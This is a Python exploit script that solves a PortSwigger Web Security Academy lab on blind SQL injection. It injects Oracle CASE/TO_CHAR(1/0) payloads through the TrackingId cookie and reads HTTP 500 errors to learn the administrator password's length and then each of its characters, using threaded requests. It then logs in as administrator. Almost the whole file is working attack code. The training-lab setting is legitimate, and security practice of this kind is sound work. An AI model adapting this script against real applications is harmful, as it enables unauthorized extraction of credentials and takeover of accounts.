#!/usr/bin/env python

'''This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

'''


import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import functools
import sys

# Vulnerable TrcakingId cookie queries (Oracle database)
#
# query'||(SELECT CASE WHEN LENGTH(password)=<NUM> THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||' - admin password length check
# query'||(SELECT CASE WHEN ASCII(SUBSTR(password,<SUBINT>,1))=<CHAR> THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||' - admin password character check


lab_id = '0aea002a03f7d7fbcaaa159a00950015' #change based on generated lab page id
base_uri = f"https://{lab_id}.web-security-academy.net/" # contains the vulnerable sqli path
length_check  = [x for x in range(0,101)] # password length iterator that goes up to 100
ascii_chart = [char for char in range(32,127)] # ascii character iterator that includes alphanumeric characters (in decmal format)


def get_password_length(num: int) -> int:
    query = f"query'||(SELECT+CASE+WHEN+LENGTH(password)={num}+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')||'"
    cookies = {'TrackingId': query}
    r = requests.get(base_uri, cookies=cookies)
    if r.status_code == 500:
        return num


def get_password(subnum: int, char: int) -> str:
        query = f"query'||(SELECT+CASE+WHEN+ASCII(SUBSTR(password,{subnum},1))={char}+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username='administrator')||'"
        cookies = {'TrackingId' : query}
        r = requests.get(base_uri, cookies=cookies)
        if r.status_code == 500:
            sys.stdout.write(chr(char))
            sys.stdout.flush()
            return chr(char)


def login(username: str, password: str) -> None:
    req = requests.session()
    login_uri = f"{base_uri}login"
    r = req.get(login_uri) 
    parse = BeautifulSoup(r.text, 'lxml')
    token = parse.find('input', {'name': 'csrf'})['value'] #csrf token
    
    data = { 'username' : username,
        'password' : password,
        'csrf': token
    }

    print(f"[*] Attempting to login with user: {username}")
    r2 = req.post(login_uri, data=data)
    if "Your username is: administrator" in r2.text:
        print("solved")
    else:
        print("nope")


def threadExecutor(function: "function", iterator: list) -> list:
    with ThreadPoolExecutor() as executor:
        results = executor.map(function,iterator)
    return results


def main() -> None:
    # Get the length of the administrator password
    password_length = ''
    for result in threadExecutor(get_password_length, length_check):
        if result:
            print(f"[+] Found admin password length of {result}. Getting admin password")
            password_length = result + 1
    if not password_length:
        print("[-] Could not find password length. Check sqli query. Exiting.")
        sys.exit(-1)
    
    # use the length of the adminstrator password to retrieve the password
    password = ''
    for i in range(1,password_length):
        password_funct = functools.partial(get_password, i)
        for result in threadExecutor(password_funct, ascii_chart):
            if result:
                password += result
    if not password:
        print("[-] Could not find password length. Check sqli query. Exiting.")
    
    # use the password to login to the app and complete the exercise
    print(f"\n[+] Logging in with password {password}")
    login('administrator', password)


if __name__ == "__main__":
    main()